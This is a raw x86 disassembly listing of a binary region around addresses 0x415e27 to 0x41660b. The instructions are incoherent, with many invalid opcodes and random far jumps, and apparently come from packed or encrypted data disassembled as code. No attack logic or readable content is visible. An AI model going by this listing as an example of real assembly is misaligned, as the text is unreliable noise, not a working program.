  415e27:	sbb    bh,0xca
  415e2a:	and    BYTE PTR [edx],0xc0
  415e2d:	sub    ecx,DWORD PTR [esi]
  415e2f:	mov    ah,BYTE PTR [ebx-0x53e5c993]
  415e35:	cmp    al,0x5c
  415e37:	cld    
  415e38:	jmp    0xe344:0xe9f11a9
  415e3f:	push   eax
  415e40:	jle    0x415e6b
  415e42:	(bad)  
  415e43:	jecxz  0x415e32
  415e45:	imul   ebp,eax,0xffffffe8
  415e48:	mov    dl,0x51
  415e4a:	xor    eax,0xea9e8b8
  415e4f:	iret   
  415e50:	sbb    ebp,DWORD PTR ss:[ebp-0x8]
  415e54:	les    esp,FWORD PTR [ecx+0xf]
  415e57:	scas   eax,DWORD PTR es:[edi]
  415e58:	stc    
  415e59:	inc    eax
  415e5a:	jmp    0xa0d:0x4a64b2ee
  415e61:	and    eax,0x64dda94b
  415e66:	call   0xc100c3a5
  415e6b:	push   cs
  415e6c:	arpl   WORD PTR ds:0xc1a925f4,sp
  415e72:	ror    DWORD PTR [ebx+0x1a],0x42
  415e76:	pop    esi
  415e77:	pop    ds
  415e78:	and    DWORD PTR [edx+0x41],edi
  415e7b:	(bad)  
  415e7c:	sti    
  415e7d:	imul   edx,DWORD PTR [ebx],0xf46c0118
  415e83:	inc    edx
  415e84:	push   0xe402d02
  415e89:	(bad)  
  415e8a:	cmp    eax,edx
  415e8c:	fidiv  DWORD PTR [ebx+0x34]
  415e8f:	sahf   
  415e90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e91:	stos   DWORD PTR es:[edi],eax
  415e92:	inc    edx
  415e93:	pop    ecx
  415e94:	sub    eax,DWORD PTR [eax+eax*2]
  415e97:	aaa    
  415e98:	xor    al,0x8a
  415e9a:	test   eax,0xf9579e76
  415e9f:	jo     0x415e95
  415ea1:	xor    eax,0x6fcdd888
  415ea6:	fimul  DWORD PTR [eax+0x1b]
  415ea9:	mov    edi,0xadf66159
  415eae:	je     0x415ec1
  415eb0:	mov    ds:0x48898210,al
  415eb5:	sbb    ch,cl
  415eb7:	inc    esi
  415eb8:	xchg   ebx,eax
  415eb9:	ds sub ebx,eax
  415ebc:	inc    ebp
  415ebd:	push   ecx
  415ebe:	add    al,0x82
  415ec0:	jp     0x415ee0
  415ec2:	and    dl,BYTE PTR [edi+eax*2-0x59d8a4f4]
  415ec9:	cld    
  415eca:	test   eax,0xdb622058
  415ecf:	xchg   esp,eax
  415ed0:	into   
  415ed1:	mov    eax,0x261d48f4
  415ed6:	mov    ds:0xb5e69f22,eax
  415edb:	or     DWORD PTR [eax+ecx*1-0x55e245b],0x29bdd5aa
  415ee6:	stc    
  415ee7:	pop    ebx
  415ee8:	adc    eax,0x22c6db1a
  415eed:	adc    esi,ebp
  415eef:	dec    edx
  415ef0:	lahf   
  415ef1:	outs   dx,BYTE PTR ds:[esi]
  415ef2:	popa   
  415ef3:	mov    ch,0x2f
  415ef5:	push   0xfffffff5
  415ef7:	add    edi,ebx
  415ef9:	jp     0x415ebb
  415efb:	iret   
  415efc:	inc    esi
  415efd:	or     al,0xd8
  415eff:	gs push 0xfffffff2
  415f02:	rol    BYTE PTR [esi+0x41],1
  415f05:	mov    al,ds:0x9a3b7355
  415f0a:	jmp    0x19f1f130
  415f0f:	push   0xffffffc8
  415f11:	xchg   edx,eax
  415f12:	mov    dl,0xcb
  415f14:	and    al,0x8d
  415f16:	js     0x415f0b
  415f18:	fstp   DWORD PTR [edx]
  415f1a:	das    
  415f1b:	mov    dl,BYTE PTR [ecx-0x6c263104]
  415f21:	leave  
  415f22:	fstp   st(4)
  415f24:	imul   edx,DWORD PTR [edx-0x67],0x75
  415f28:	out    0xc1,eax
  415f2a:	pop    ss
  415f2b:	lods   eax,DWORD PTR ds:[esi]
  415f2c:	dec    BYTE PTR [ebx]
  415f2e:	adc    esp,DWORD PTR [ebx]
  415f30:	add    BYTE PTR ds:0x4cfad130,0x27
  415f37:	sbb    ebp,esi
  415f39:	mov    edx,0x56e51e1b
  415f3e:	lods   al,BYTE PTR ds:[esi]
  415f3f:	(bad)  
  415f41:	cmp    BYTE PTR [esp+eiz*8],ch
  415f44:	mov    ah,0x2f
  415f46:	out    dx,al
  415f47:	push   ebp
  415f48:	in     eax,0xe2
  415f4a:	sub    BYTE PTR [eax+ebx*2+0x2],ah
  415f4e:	stos   DWORD PTR es:[edi],eax
  415f4f:	adc    DWORD PTR [ecx-0x17],edi
  415f52:	enter  0x61f4,0x7c
  415f56:	push   esi
  415f57:	gs inc esi
  415f59:	lea    edx,[edx-0x6e]
  415f5c:	cmp    ecx,0x24672643
  415f62:	test   DWORD PTR ds:0xcbca2e76,esp
  415f68:	fcom   QWORD PTR [eax+0x36531922]
  415f6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f6f:	fdivr  DWORD PTR ds:0xd7e68c2a
  415f75:	in     eax,dx
  415f76:	rcr    eax,1
  415f78:	jg     0x415f50
  415f7a:	fnstcw WORD PTR [ebx]
  415f7c:	xor    al,0xc5
  415f7e:	pop    ebx
  415f7f:	xchg   ecx,eax
  415f80:	mov    cl,0xa0
  415f82:	stc    
  415f83:	rcl    BYTE PTR [edi],cl
  415f85:	sub    ah,BYTE PTR [edi-0x4a36628e]
  415f8b:	xchg   esi,eax
  415f8c:	mov    eax,ds:0x82fc0ebf
  415f91:	data16 aam 0x5b
  415f94:	fistp  QWORD PTR [edi+edx*2]
  415f97:	inc    eax
  415f98:	nop
  415f99:	imul   esi,DWORD PTR [ebp-0x69],0x61ed4fb7
  415fa0:	aad    0x6e
  415fa2:	stc    
  415fa3:	and    ah,BYTE PTR [ebp-0x5898f17f]
  415fa9:	lods   eax,DWORD PTR ds:[esi]
  415faa:	mov    edi,0xe38b8a2
  415faf:	adc    eax,0x9ca7bf42
  415fb4:	mov    dh,0x4a
  415fb6:	xor    esi,DWORD PTR [edi-0x6dfc5ab7]
  415fbc:	inc    eax
  415fbd:	test   DWORD PTR ds:[eax+0x5ef9ce90],esp
  415fc4:	add    eax,0xbf86d625
  415fc9:	jo     0x415fcf
  415fcb:	les    eax,FWORD PTR [esi+0x6c]
  415fce:	hlt    
  415fcf:	inc    edx
  415fd0:	dec    ecx
  415fd1:	(bad)  
  415fd2:	fisub  DWORD PTR [eax-0x129eee7a]
  415fd8:	(bad)  
  415fd9:	in     eax,dx
  415fda:	adc    eax,DWORD PTR [ebx-0x5]
  415fdd:	out    0x4d,eax
  415fdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fe0:	rcl    BYTE PTR [ebx-0x517f55d6],1
  415fe6:	lods   al,BYTE PTR ds:[esi]
  415fe7:	and    al,0x3b
  415fe9:	in     eax,0xd6
  415feb:	dec    esi
  415fec:	ret    0xf611
  415fef:	or     edx,DWORD PTR [esi]
  415ff1:	xlat   BYTE PTR ds:[ebx]
  415ff2:	mov    al,ds:0x77798800
  415ff7:	repnz call 0xc845:0x123727dc
  415fff:	xor    dh,0xc7
  416002:	dec    eax
  416003:	dec    ecx
  416004:	stos   BYTE PTR es:[edi],al
  416005:	inc    BYTE PTR [eax-0x29]
  416008:	xchg   esp,eax
  416009:	mov    ds:0xc80b2b1a,al
  41600e:	mov    esi,0x15eed750
  416013:	jo     0x41604d
  416015:	daa    
  416016:	je     0x416020
  416018:	ins    DWORD PTR es:[edi],dx
  416019:	mov    al,ds:0x394b3fd0
  41601e:	imul   edi,edx,0x16
  416021:	xchg   ebx,eax
  416022:	sbb    BYTE PTR [edi-0x47],dl
  416025:	xor    esp,DWORD PTR cs:[edx]
  416028:	shl    BYTE PTR [ecx+0x20afe3e0],cl
  41602e:	add    eax,0xb1b7fc0d
  416033:	pushf  
  416034:	(bad)  
  416036:	pop    edi
  416037:	push   eax
  416038:	sbb    eax,0xe723a09b
  41603d:	adc    al,0xa2
  41603f:	out    dx,al
  416040:	test   eax,0x3475a2fe
  416045:	mov    bl,BYTE PTR [ebx]
  416047:	(bad)  
  416048:	pop    ds
  416049:	push   eax
  41604a:	mov    ah,0xc6
  41604c:	jae    0x41608f
  41604e:	(bad)  
  41604f:	cs pop eax
  416051:	fmul   DWORD PTR [esi+eiz*4]
  416054:	lahf   
  416055:	mov    dh,0x8c
  416057:	add    esp,DWORD PTR [edx+0x395a2cc3]
  41605d:	das    
  41605e:	jp     0x4160d7
  416060:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416061:	dec    ebx
  416062:	scas   eax,DWORD PTR es:[edi]
  416063:	(bad)  
  416064:	fadd   st,st(3)
  416066:	cli    
  416067:	jmp    0x4160ca
  416069:	mov    edi,ebp
  41606b:	loop   0x415fff
  41606d:	nop    DWORD PTR [edx]
  416070:	std    
  416071:	inc    ecx
  416072:	jo     0x416093
  416074:	sbb    eax,DWORD PTR [ebp+0x1b]
  416077:	adc    DWORD PTR [ebx+ecx*1],esp
  41607a:	sub    dh,BYTE PTR [esp+edi*4]
  41607d:	aad    0xfb
  41607f:	fisubr WORD PTR [ecx-0x7cd327b3]
  416085:	mov    eax,?
  416087:	mov    ds:0x2b576dca,eax
  41608c:	adc    al,0xc1
  41608e:	and    edx,ebp
  416090:	sbb    dl,BYTE PTR [edx+0x79]
  416093:	xchg   BYTE PTR [ebx+0x18281f0d],ah
  416099:	cli    
  41609a:	(bad)  
  41609b:	dec    edi
  41609c:	in     eax,dx
  41609d:	push   ds
  41609e:	add    eax,0xeadd015
  4160a3:	bound  esi,QWORD PTR [edx+0x2f]
  4160a6:	ins    DWORD PTR es:[edi],dx
  4160a7:	sahf   
  4160a8:	sbb    DWORD PTR [esi+0x3f],esi
  4160ab:	data16 adc BYTE PTR [edx-0x4bd8f5a3],cl
  4160b2:	pop    ebx
  4160b3:	mov    ebp,cs
  4160b5:	fnstenv [ebp+0x75]
  4160b8:	jecxz  0x416098
  4160ba:	mov    ebp,0xf81638b1
  4160bf:	loope  0x416067
  4160c1:	jmp    0xf6eb:0x77370b93
  4160c8:	lea    esi,[edx]
  4160ca:	xor    al,ch
  4160cc:	sbb    DWORD PTR [ecx-0x3f8b2812],0x5e
  4160d3:	pop    ds
  4160d4:	adc    al,0xec
  4160d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160d7:	pop    edx
  4160d8:	shr    BYTE PTR [esi],0x7b
  4160db:	ret    0x8020
  4160de:	fwait
  4160df:	push   eax
  4160e0:	dec    edi
  4160e1:	inc    esp
  4160e2:	pop    edx
  4160e3:	xchg   ebp,eax
  4160e4:	ret    
  4160e5:	leave  
  4160e6:	cmp    edx,DWORD PTR [edx+0x515f2098]
  4160ec:	(bad)  
  4160ed:	jecxz  0x41612e
  4160ef:	cli    
  4160f0:	in     eax,dx
  4160f1:	cli    
  4160f2:	jge    0x41616d
  4160f4:	call   0x6fb47fe1
  4160f9:	or     eax,0x70a1c85c
  4160fe:	push   0xa7a00421
  416103:	dec    ebx
  416104:	popf   
  416105:	mov    al,ds:0x699756e6
  41610a:	or     dh,BYTE PTR [eax-0x2c]
  41610d:	cmp    edx,esi
  41610f:	fcom   DWORD PTR [ecx+0x575a23ee]
  416115:	cmp    BYTE PTR ds:0x5271bf82,al
  41611b:	enter  0xe1f9,0xd4
  41611f:	and    al,0x10
  416121:	in     al,0x1c
  416123:	leave  
  416124:	mov    ebp,gs
  416126:	aas    
  416127:	pop    eax
  416128:	test   al,0x5d
  41612a:	mov    ebp,0x70835a68
  41612f:	push   esi
  416130:	pushf  
  416131:	mov    ecx,0x11522080
  416136:	in     eax,dx
  416137:	cwde   
  416138:	mov    bh,bh
  41613a:	xlat   BYTE PTR ds:[ebx]
  41613b:	call   0x6d8d5941
  416140:	xchg   ebp,eax
  416141:	je     0x4160d4
  416143:	or     cl,BYTE PTR [eax+eiz*8]
  416146:	retf   
  416147:	inc    ecx
  416148:	adc    BYTE PTR [ebp-0x1e1b20ef],dl
  41614e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41614f:	clc    
  416150:	mov    eax,ds:0xd894533c
  416155:	inc    esi
  416156:	or     ecx,ebp
  416158:	pop    eax
  416159:	cmp    al,0x14
  41615b:	mov    eax,0x4251b348
  416160:	imul   edx,DWORD PTR cs:[esi],0x47
  416164:	nop
  416165:	push   ebx
  416166:	jno    0x4160ec
  416168:	aam    0xbf
  41616a:	gs imul esi,ecx,0x4fb51e3f
  416171:	fs jne 0x4161b8
  416174:	out    dx,al
  416175:	fwait
  416176:	not    esp
  416178:	inc    edi
  41617a:	adc    DWORD PTR [eax-0x3c9c8ce2],edi
  416180:	inc    ebp
  416181:	lahf   
  416182:	xchg   edx,eax
  416183:	ins    BYTE PTR es:[edi],dx
  416184:	bound  edx,QWORD PTR [esp+eax*1+0x3090aa8a]
  41618b:	in     eax,0xcf
  41618d:	cmp    al,0xf4
  41618f:	scas   al,BYTE PTR es:[edi]
  416190:	or     cl,dh
  416192:	push   0x5e
  416194:	call   0xf6f97029
  416199:	adc    esi,DWORD PTR [ebp+0x40]
  41619c:	ins    BYTE PTR es:[edi],dx
  41619d:	push   cs
  41619e:	leave  
  41619f:	cmp    edi,0xfedfd803
  4161a5:	test   al,0xaf
  4161a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161a8:	std    
  4161a9:	mov    dl,0xa3
  4161ab:	dec    edx
  4161ac:	int3   
  4161ad:	(bad)
  4161b1:	(bad)  
  4161b2:	sbb    edx,DWORD PTR [edi+0x67aad5f9]
  4161b8:	aad    0xf5
  4161ba:	pop    es
  4161bb:	jae    0x416215
  4161bd:	dec    esi
  4161be:	aad    0x81
  4161c0:	mov    dh,0x70
  4161c2:	push   0x725ae976
  4161c7:	lahf   
  4161c8:	mov    dl,0x46
  4161ca:	jnp    0x4161b3
  4161cc:	pop    ebx
  4161cd:	fnstcw WORD PTR [edx-0x25]
  4161d0:	mov    edx,0xc570cc79
  4161d5:	inc    esp
  4161d6:	xchg   BYTE PTR [ebp-0x1d],cl
  4161d9:	pop    edx
  4161da:	shr    DWORD PTR [esi-0x4ac99d92],cl
  4161e0:	pop    edx
  4161e1:	out    0xc6,al
  4161e3:	inc    ecx
  4161e4:	jecxz  0x416238
  4161e6:	ins    DWORD PTR es:[edi],dx
  4161e7:	loopne 0x4161b3
  4161e9:	retf   
  4161ea:	cmp    al,0xdc
  4161ec:	xorps  xmm6,XMMWORD PTR ss:0xa8f5f8f6
  4161f4:	add    al,0x24
  4161f7:	jp     0x4161ff
  4161f9:	push   ebp
  4161fa:	fbld   TBYTE PTR [edi-0x5e73b6cd]
  416200:	aas    
  416201:	or     eax,0xab5f27b6
  416207:	xchg   bh,cl
  416209:	pop    eax
  41620a:	es or  al,0xfd
  41620d:	jo     0x416260
  41620f:	push   ebx
  416210:	stos   DWORD PTR es:[edi],eax
  416211:	loopne 0x4161b5
  416213:	icebp  
  416214:	or     BYTE PTR [ebp+0x596b9fb9],ch
  41621a:	iret   
  41621b:	cmp    BYTE PTR [esi-0x36ac2605],ah
  416221:	add    BYTE PTR [esi],dh
  416223:	cwde   
  416224:	and    BYTE PTR [edi+0x7d],bh
  416227:	inc    esi
  416228:	push   ebp
  416229:	mov    edx,0x4fb85ec3
  41622e:	mov    esi,0xcb6fd9d8
  416233:	push   eax
  416234:	push   ebx
  416235:	dec    edx
  416236:	in     eax,0x7a
  416238:	xchg   DWORD PTR [edi-0x21],esi
  41623b:	mov    bh,0xa5
  41623d:	add    al,0xfe
  41623f:	(bad)  
  416240:	push   esi
  416241:	jg     0x416252
  416243:	jle    0x416281
  416245:	fsub   QWORD PTR [esi-0xad7c528]
  41624b:	add    al,0x6
  41624d:	mov    WORD PTR [edx+eax*1-0x3884dda1],cs
  416254:	out    0xb2,eax
  416256:	xor    eax,0x455060dd
  41625b:	jnp    0x416270
  41625d:	bound  esp,QWORD PTR [esi]
  41625f:	inc    edx
  416260:	xchg   ecx,eax
  416261:	sub    al,0x4
  416263:	ficomp DWORD PTR [esi]
  416265:	xchg   ebp,eax
  416266:	and    ecx,DWORD PTR [ebx]
  416268:	jns    0x416258
  41626a:	adc    esi,ebp
  41626c:	pop    edi
  41626d:	outs   dx,DWORD PTR ds:[esi]
  41626e:	out    dx,al
  41626f:	pop    ss
  416270:	dec    edi
  416271:	sbb    eax,0x9fb45dc9
  416276:	push   esp
  416277:	out    dx,al
  416278:	jns    0x4162e8
  41627a:	bnd jg 0x41626e
  41627d:	cdq    
  41627e:	lods   al,BYTE PTR ds:[esi]
  41627f:	mov    ch,0x86
  416281:	aam    0xe4
  416283:	push   0x7a
  416285:	lods   eax,DWORD PTR ds:[esi]
  416286:	inc    edi
  416287:	jl     0x416293
  416289:	jg     0x416216
  41628b:	sti    
  41628c:	stc    
  41628d:	add    BYTE PTR [ebx+0xd],0x5c
  416291:	(bad)  
  416292:	stos   DWORD PTR es:[edi],eax
  416293:	sub    DWORD PTR [edi-0x5dd2fc55],ebp
  416299:	jns    0x4162ed
  41629b:	mov    ecx,0x6f0cbe54
  4162a0:	retf   0x673a
  4162a3:	sub    BYTE PTR [ebp+0x54],bl
  4162a6:	cmp    DWORD PTR [edx-0x29],esp
  4162a9:	pop    es
  4162aa:	(bad)  
  4162ab:	cmp    al,0xf7
  4162ad:	xlat   BYTE PTR ds:[ebx]
  4162ae:	pusha  
  4162af:	mov    edi,0x3047c938
  4162b4:	mov    dl,BYTE PTR ds:0xe87a42a9
  4162ba:	in     al,dx
  4162bb:	pop    ecx
  4162bc:	xchg   ebp,eax
  4162bd:	or     al,BYTE PTR [ebx-0x37f2631b]
  4162c3:	adc    esp,eax
  4162c5:	jmp    0x8298aa9
  4162ca:	imul   esp,ecx,0xffffffd5
  4162cd:	push   edx
  4162ce:	mov    esi,0xe9317182
  4162d3:	xor    BYTE PTR [esi+0x1bbe9c33],al
  4162d9:	add    esp,ebp
  4162db:	mov    dh,0x6f
  4162dd:	jne    0x416310
  4162df:	mov    ecx,0x7a624588
  4162e4:	mov    ecx,0xb0962435
  4162e9:	xchg   esp,eax
  4162ea:	xchg   ecx,eax
  4162eb:	or     BYTE PTR ds:0xa75fcb58,al
  4162f1:	jne    0x4162fc
  4162f3:	into   
  4162f4:	cmpxchg8b (bad)
  4162f5:	(bad)  
  4162f6:	leave  
  4162f7:	aad    0xd
  4162f9:	pop    ecx
  4162fa:	sahf   
  4162fb:	pop    ecx
  4162fc:	out    dx,al
  4162fd:	in     eax,0x8f
  4162ff:	jbe    0x41629a
  416301:	rol    DWORD PTR [esi+0x592a8dee],1
  416307:	inc    esi
  416308:	jmp    0xc35e:0xe3d125c1
  41630f:	fild   DWORD PTR [edi-0x40]
  416312:	retf   0xa97
  416315:	mov    ecx,0x4ff59d56
  41631a:	adc    eax,0x2301d651
  41631f:	call   0xf6da:0xcdc1fdf1
  416326:	mov    bl,ah
  416328:	sahf   
  416329:	cmp    DWORD PTR [esi],eax
  41632b:	mov    eax,DWORD PTR [ecx]
  41632d:	sbb    ecx,ebx
  41632f:	pusha  
  416330:	jo     0x416371
  416332:	lds    eax,FWORD PTR [ecx+0x32513982]
  416338:	in     eax,dx
  416339:	jecxz  0x41635f
  41633b:	popa   
  41633c:	cmp    esi,ecx
  41633e:	mov    ?,WORD PTR [ebp-0x6e]
  416341:	add    BYTE PTR [esi-0x19b83aad],al
  416347:	xlat   BYTE PTR ds:[ebx]
  416348:	fwait
  416349:	je     0x4162ee
  41634b:	and    DWORD PTR [esi+0x5920bd23],esi
  416351:	mov    ch,0x7b
  416353:	push   eax
  416354:	mov    bh,BYTE PTR [ebp-0x30]
  416357:	mov    DWORD PTR [ebp-0x6d],ebx
  41635a:	iret   
  41635b:	pusha  
  41635c:	call   0xd6acb0ed
  416361:	cmp    eax,0x9ee69c7b
  416366:	and    eax,ecx
  416368:	cld    
  416369:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41636b:	imul   eax,ecx,0x9dda7265
  416371:	into   
  416372:	sbb    BYTE PTR [ebp+0x7a],dh
  416375:	aam    0x37
  416377:	imul   eax,ecx,0xea55d1b9
  41637d:	mov    ebp,0xd426e0fa
  416382:	rol    DWORD PTR [edi+ecx*2-0x6b],1
  416386:	aad    0x23
  416388:	dec    ebx
  416389:	xchg   ecx,eax
  41638b:	add    al,0xa1
  41638d:	dec    esi
  41638e:	ins    BYTE PTR es:[edi],dx
  41638f:	add    al,0x36
  416391:	sub    BYTE PTR [eax+0x5b647e86],0xda
  416398:	push   esi
  416399:	mov    bl,0xe5
  41639b:	shl    DWORD PTR [ebx+0x17cf3e43],0xb
  4163a2:	repz xchg esi,eax
  4163a4:	or     cl,BYTE PTR [ecx]
  4163a6:	or     edx,esp
  4163a8:	out    dx,al
  4163a9:	pop    ss
  4163aa:	(bad)
  4163ad:	mov    BYTE PTR [edi],al
  4163af:	mul    BYTE PTR [edx-0x44]
  4163b2:	push   ss
  4163b3:	mov    ch,0x2c
  4163b5:	jmp    0x7288:0x6a3a8115
  4163bc:	outs   dx,BYTE PTR ds:[esi]
  4163bd:	cmp    BYTE PTR [eax-0x44c5d81a],al
  4163c3:	ret    
  4163c4:	mul    BYTE PTR [ebx]
  4163c6:	push   0x62
  4163c8:	inc    esi
  4163c9:	jae    0x4163f5
  4163cb:	shr    BYTE PTR [ecx+0x7acacd8f],cl
  4163d1:	pop    es
  4163d2:	cmp    eax,0xa7c901ac
  4163d7:	sti    
  4163d8:	and    edx,DWORD PTR [ebp-0x4b7b664d]
  4163de:	jno    0x416432
  4163e0:	fsubr  DWORD PTR [edx+0x69]
  4163e3:	push   esi
  4163e4:	add    BYTE PTR [ebx+0x2e],0x95
  4163e8:	aas    
  4163e9:	pop    ss
  4163ea:	pop    ss
  4163eb:	daa    
  4163ec:	cmc    
  4163ed:	or     eax,0xdaacb0fa
  4163f2:	cld    
  4163f3:	sub    ebp,0xa731b7bc
  4163f9:	cmc    
  4163fa:	and    al,0x48
  4163fc:	call   0x222db810
  416401:	jae    0x416398
  416403:	ds sbb eax,0xf2e593d2
  416409:	cld    
  41640a:	dec    edx
  41640b:	fs xchg esp,eax
  41640d:	aam    0x75
  41640f:	test   ah,bh
  416411:	adc    al,0xe9
  416413:	in     al,0x7b
  416415:	popa   
  416416:	test   al,0x97
  416418:	adc    ebx,DWORD PTR [edx-0x53f70b07]
  41641e:	xchg   DWORD PTR [esi],edx
  416420:	loope  0x41646d
  416422:	add    DWORD PTR ss:[eax+0x349fbafd],0x1a4c4a1c
  41642d:	and    BYTE PTR [edx],bh
  41642f:	sbb    bh,BYTE PTR [edi]
  416431:	or     al,0xc7
  416433:	inc    ebp
  416434:	xchg   ebx,eax
  416435:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416436:	or     DWORD PTR [esp+eax*1-0x3f],esi
  41643a:	mov    esp,0x46fc4307
  41643f:	push   ebp
  416440:	jae    0x416434
  416442:	inc    edx
  416443:	shr    DWORD PTR [esi-0x651d11cd],1
  416449:	pop    ecx
  41644a:	cmp    eax,0x1ef2ddde
  41644f:	stos   BYTE PTR es:[edi],al
  416450:	js     0x41649f
  416452:	add    ebx,DWORD PTR [edx+0x6e]
  416455:	inc    esp
  416456:	sbb    eax,0xd1de5384
  41645b:	sub    BYTE PTR [esi-0x1c49cac2],dl
  416461:	or     DWORD PTR [edx-0x11],0x9ab06069
  416468:	mov    DWORD PTR [eax-0x7f],edi
  41646b:	add    BYTE PTR [eax-0x48],cl
  41646e:	stc    
  41646f:	pop    edx
  416470:	ja     0x416478
  416472:	popa   
  416473:	pop    edx
  416474:	mov    al,0x9
  416476:	xchg   ecx,eax
  416477:	push   esi
  416478:	mov    BYTE PTR [ecx-0x4c],al
  41647b:	fnstsw WORD PTR [eax+0x53f3b61c]
  416481:	outs   dx,DWORD PTR ds:[esi]
  416482:	scas   al,BYTE PTR es:[edi]
  416483:	fld    QWORD PTR [ecx]
  416485:	sbb    al,0x66
  416487:	sar    DWORD PTR [edx+edx*4],1
  41648a:	pop    DWORD PTR [ebx+0x407eb611]
  416490:	pop    esi
  416491:	dec    ecx
  416492:	cmp    al,BYTE PTR [eax-0x31]
  416495:	xor    eax,0x98e96e46
  41649a:	ins    DWORD PTR es:[edi],dx
  41649b:	add    al,0xfd
  41649d:	inc    ebp
  41649e:	xchg   ecx,eax
  41649f:	jno    0x4164e5
  4164a1:	push   ebx
  4164a2:	push   0x7db570f
  4164a7:	shl    esp,1
  4164a9:	dec    ebp
  4164aa:	jae    0x41644b
  4164ac:	xor    al,0xfa
  4164ae:	inc    esi
  4164af:	dec    esp
  4164b0:	mov    al,ah
  4164b2:	cmp    eax,DWORD PTR [edx+0x13a58699]
  4164b8:	sar    esp,0xaa
  4164bb:	ins    BYTE PTR es:[edi],dx
  4164bc:	stc    
  4164bd:	sub    al,0x83
  4164bf:	push   esp
  4164c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164c1:	or     BYTE PTR fs:[ebp+0x24df3cbe],0xa4
  4164c9:	gs mov esi,gs
  4164cc:	in     al,dx
  4164cd:	shl    BYTE PTR ds:0xbabc84d9,cl
  4164d3:	cmp    dl,bh
  4164d5:	shl    DWORD PTR [ecx-0x6c],cl
  4164d8:	pop    ecx
  4164d9:	xchg   ebp,eax
  4164da:	pop    ss
  4164db:	pop    ss
  4164dc:	cmp    BYTE PTR [esi],cl
  4164de:	scas   eax,DWORD PTR es:[edi]
  4164df:	xor    eax,0x184298d3
  4164e4:	mov    eax,0xe43a5d45
  4164e9:	jnp    0x416536
  4164eb:	xor    BYTE PTR [ebx],cl
  4164ed:	add    DWORD PTR [esi+eax*2-0x23],0x3d17c9da
  4164f5:	jno    0x416510
  4164f7:	cmp    eax,0x8405e3e
  4164fc:	pop    edx
  4164fd:	int    0x20
  4164ff:	ins    DWORD PTR es:[edi],dx
  416500:	xchg   DWORD PTR ds:0x5fcf728d,eax
  416506:	add    ah,BYTE PTR [ebx]
  416508:	cmp    DWORD PTR [eax],0x70993a98
  41650e:	adc    ah,BYTE PTR [ecx-0xdbc6fd8]
  416514:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416515:	xor    bl,cl
  416517:	xor    BYTE PTR [ebx+0x5d],al
  41651a:	je     0x41651a
  41651c:	fwait
  41651d:	cmp    edx,ebp
  41651f:	mov    dh,0x7b
  416521:	sar    BYTE PTR [eax+0x23e7f86e],cl
  416527:	icebp  
  416528:	call   0x1961:0x783ea9a
  41652f:	call   0xe9e635cd
  416534:	jno    0x41658f
  416536:	cmp    al,0xd
  416538:	jbe    0x4164f0
  41653a:	mov    cl,0x44
  41653c:	xchg   ebx,eax
  41653d:	shl    DWORD PTR ds:0x95e6c13d,cl
  416543:	out    0xe2,al
  416545:	les    ecx,FWORD PTR [eax+edx*2-0x1e]
  416549:	dec    edx
  41654a:	pushf  
  41654b:	jns    0x41654c
  41654d:	xor    esi,ebx
  41654f:	shr    DWORD PTR [esi+0x45b3bdfb],0x3d
  416556:	test   bl,al
  416558:	adc    DWORD PTR [esi+edx*2],ebx
  41655b:	add    al,ah
  41655d:	xchg   ebp,eax
  41655e:	add    al,0x95
  416560:	aad    0x5c
  416562:	scas   eax,DWORD PTR es:[edi]
  416563:	or     eax,0xbdc6b0c6
  416568:	and    cl,ah
  41656a:	push   es
  41656b:	inc    ebp
  41656c:	(bad)  
  41656d:	js     0x4165d2
  41656f:	ins    BYTE PTR es:[edi],dx
  416570:	pop    edi
  416571:	fldcw  WORD PTR [ecx+ebp*2+0x34bf7d95]
  416578:	mov    edi,0xef30c6bb
  41657d:	iret   
  41657e:	add    BYTE PTR [edi+0x79],0x50
  416582:	add    eax,0xf97243e8
  416587:	das    
  416588:	pop    esi
  416589:	stos   BYTE PTR es:[edi],al
  41658a:	push   0x7c5b22d7
  41658f:	dec    esp
  416590:	rcl    DWORD PTR [esi+ebp*4-0x78],1
  416594:	and    ebx,edi
  416596:	dec    ecx
  416597:	scas   al,BYTE PTR es:[edi]
  416598:	mov    al,ds:0x9ca34900
  41659d:	xrelease mov DWORD PTR [esi+ebp*2],esp
  4165a1:	retf   0x2514
  4165a4:	xor    eax,0x605f59f6
  4165a9:	dec    ebp
  4165aa:	call   ebx
  4165ac:	inc    esi
  4165ad:	sar    DWORD PTR ss:[eax+0x4e],0xa6
  4165b2:	imul   ecx,DWORD PTR [ebx-0x3d],0xffffffd8
  4165b6:	cld    
  4165b7:	adc    bh,BYTE PTR [edi+edi*8-0x1d]
  4165bb:	les    ebx,FWORD PTR [eax+ebx*4-0x7c4729ea]
  4165c2:	aam    0x1f
  4165c4:	adc    DWORD PTR [ecx-0x6a7d697e],0xfa74f13a
  4165ce:	and    BYTE PTR [ebx],al
  4165d0:	add    edx,DWORD PTR [edx-0x6b]
  4165d3:	fcomp  DWORD PTR [esi-0x372fbd38]
  4165d9:	das    
  4165da:	pop    es
  4165db:	and    BYTE PTR [eax+ebx*1+0x1f],cl
  4165df:	push   es
  4165e0:	int3   
  4165e1:	inc    eax
  4165e2:	scas   al,BYTE PTR es:[edi]
  4165e3:	ret    
  4165e4:	jp     0x416581
  4165e6:	adc    cl,BYTE PTR [esi-0x439432e7]
  4165ec:	stos   BYTE PTR es:[edi],al
  4165ed:	or     DWORD PTR [ecx],esi
  4165ef:	sbb    eax,0xa28a4b04
  4165f4:	idiv   BYTE PTR [eax-0x59]
  4165f7:	out    dx,al
  4165f8:	daa    
  4165f9:	pop    esp
  4165fa:	mov    WORD PTR [ebp+0xd],ss
  4165fd:	xchg   ebx,eax
  4165fe:	sub    bl,BYTE PTR [ebp-0x37]
  416601:	push   ecx
  416602:	mov    al,0xf0
  416604:	addr16 dec ecx
  416606:	mov    ch,0x50
  416608:	adc    ebx,DWORD PTR [ebx-0x27]
  41660b:	sub    bh,BYTE PTR [esp+ebp*2]
